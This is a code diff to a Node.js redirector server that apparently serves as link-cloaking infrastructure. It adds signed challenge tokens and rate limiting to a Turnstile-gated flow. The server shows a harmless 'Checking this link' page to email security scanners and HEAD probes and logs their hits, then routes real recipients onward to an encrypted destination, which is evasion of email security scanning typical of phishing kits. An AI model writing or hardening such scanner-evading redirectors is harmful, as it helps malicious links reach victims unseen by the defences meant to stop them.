@@ -1,4 +1,4 @@
-// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.4 Beta)
+// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.5 Beta)
 require("dotenv").config();
 const express = require("express");
 const crypto = require("crypto");
@@ -504,8 +504,49 @@ function hashFirstSeg(pathStr) {
   return crypto.createHash("sha256").update(first).digest("base64url").slice(0, 32);
 }
 
+// ================== CHALLENGE TOKEN FUNCTIONS (using ADMIN_TOKEN) ==================
+function createChallengeToken(nextEnc) {
+  const exp = Date.now() + (10 * 60 * 1000); // 10 min expiry
+  const payload = { next: nextEnc, exp, ts: Date.now() };
+  const token = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const sig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
+                   .update(token).digest('base64url');
+  return `${token}.${sig}`;
+}
+
+function verifyChallengeToken(challengeToken) {
+  if (!challengeToken || typeof challengeToken !== 'string') return null;
+  
+  const parts = challengeToken.split('.');
+  if (parts.length !== 2) return null;
+  
+  const [token, sig] = parts;
+  
+  // Verify signature using ADMIN_TOKEN
+  const expectedSig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
+                          .update(token).digest('base64url');
+  if (sig !== expectedSig) return null;
+  
+  try {
+    const payload = JSON.parse(Buffer.from(token, 'base64url').toString());
+    // Check expiry
+    if (Date.now() > payload.exp) return null;
+    return payload;
+  } catch (e) {
+    return null;
+  }
+}
+
+// ================== ENHANCED CHALLENGE LIMITER ==================
+const limitChallengeView = makeIpLimiter({ 
+  capacity: parseInt(process.env.CHALLENGE_VIEW_CAPACITY || "5", 10), 
+  windowSec: parseInt(process.env.CHALLENGE_VIEW_WINDOW_SEC || "300", 10), 
+  keyPrefix: "challenge_view" 
+});
+
 /* ================== INSERTED: Interstitial helper (scanner-safe landing) ===================== */
 function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
+  const challengeToken = createChallengeToken(nextEnc);
   res.setHeader("Cache-Control", "no-store");
   res.type("html").send(`<!doctype html><meta charset="utf-8">
 <title>Checking link…</title>
@@ -513,7 +554,7 @@ function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
 <body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
   <h1>Checking this link</h1>
   <p>This link was pre-scanned by security software. If you're the recipient, click continue.</p>
-  <p><a href="/challenge?next=${encodeURIComponent(nextEnc)}" rel="noopener">Continue</a></p>
+  <p><a href="/challenge?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
   <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
 </body>`);
 }
@@ -1403,14 +1444,32 @@ async function handleRedirectCore(req, res, baseString){
 }
 
 /* ================== Challenge page (explicit render + CSP) ================ */
-app.get("/challenge", (req, res) => {
-  const nextEnc = String(req.query.next || "");
+app.get("/challenge", limitChallengeView, (req, res) => {
+  let nextEnc = "";
+  
+  if (req.query.ct) {
+    // New signed token approach
+    const payload = verifyChallengeToken(String(req.query.ct));
+    if (!payload) {
+      addLog(`[CHALLENGE] Invalid or expired challenge token`);
+      return res.status(400).send("Invalid or expired challenge link");
+    }
+    nextEnc = payload.next;
+    addLog(`[CHALLENGE] Valid token nextLen=${nextEnc.length} age=${Date.now() - payload.ts}ms`);
+  } else if (req.query.next) {
+    // Legacy support - but log it as less secure
+    nextEnc = String(req.query.next);
+    addLog(`[CHALLENGE] LEGACY next parameter used len=${nextEnc.length} - consider updating links`);
+  } else {
+    return res.status(400).send("Missing challenge data");
+  }
+
   const nextPath = safeDecode(nextEnc);
   const [baseOnly] = nextPath.split("?");
   const linkHash = hashFirstSeg(baseOnly);
   const cdata = `${linkHash}_${Math.floor(Date.now()/1000)}`;
 
-  addLog(`[CHALLENGE] next='${nextEnc.slice(0,URL_DISPLAY_MAX_LENGTH)}' cdata=${cdata.slice(0,16)}…`);
+  addLog(`[CHALLENGE] secured next='${nextEnc.slice(0,20)}…' cdata=${cdata.slice(0,16)}…`);
   addLog(`[TS-PAGE] sitekey=${TURNSTILE_SITEKEY.slice(0,12)}… hash=${linkHash.slice(0,8)}…`);
 
   res.setHeader("Cache-Control", "no-store");
@@ -1541,19 +1600,17 @@ res.type("html").send(`<!doctype html><html><head>
 app.get("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3); // strip leading "/e/"
   const clean = urlPathFull.split("?")[0];
-  const nextEnc = encodeURIComponent(clean);
   addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
-  logScannerHit(req, "Email-safe path", nextEnc);        // <- inserted logging call
-  return renderScannerSafePage(res, nextEnc, "Email-safe path");
+  logScannerHit(req, "Email-safe path", clean);
+  return renderScannerSafePage(res, clean, "Email-safe path");
 });
 // HEAD probes on /e should also get 200 interstitial (benign)
 app.head("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3);
   const clean = urlPathFull.split("?")[0];
-  const nextEnc = encodeURIComponent(clean);
   addLog(`[INTERSTITIAL] HEAD /e path`);
-  logScannerHit(req, "HEAD-probe", nextEnc);             // <- inserted logging call
-  return renderScannerSafePage(res, nextEnc, "HEAD-probe");
+  logScannerHit(req, "HEAD-probe", clean);
+  return renderScannerSafePage(res, clean, "HEAD-probe");
 });
 /* ===================================================================================== */
 /* ================== Admin scanner stats endpoint (inserted) ============== */
@@ -1628,6 +1685,7 @@ function startupSummary() {
     `  • RateLimit: capacity=${RATE_CAPACITY}/window=${RATE_WINDOW_SECONDS}s`,
     `  • Bans: ttl=${BAN_TTL_SEC}s threshold=${BAN_AFTER_STRIKES} hpWeight=${STRIKE_WEIGHT_HP}`,
     `  • Allowlist: exact=[${ALLOWLIST_DOMAINS.join(",")||"-"}] suffix=[${ALLOWLIST_SUFFIXES.join(",")||"-"}]`,
+    `  • Challenge security: rateLimit=5/5min tokens=10min`,
     `  • Geo fallback active=${Boolean(geoip)}`
   ].join("\n");
 }
